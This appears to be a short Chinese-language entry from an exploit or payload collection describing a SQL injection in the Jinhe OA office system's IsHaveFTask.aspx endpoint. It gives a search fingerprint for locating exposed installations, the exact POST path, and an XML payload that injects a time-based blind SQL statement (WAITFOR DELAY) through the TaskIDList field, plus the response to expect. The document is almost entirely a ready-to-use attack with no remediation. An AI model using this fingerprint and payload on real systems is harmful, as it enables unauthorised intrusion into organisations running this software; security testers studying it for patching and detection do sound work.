# 金和OAIsHaveFTask存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.dailytaskmanage/IsHaveFTask.aspx/ HTTP/1.1`

**Payload**
```
<root>
<Task>
<TaskIDList>3);WAITFOR DELAY'0:0:5'-- </TaskIDList>
</Task>
</root>
```
- **响应特征**：200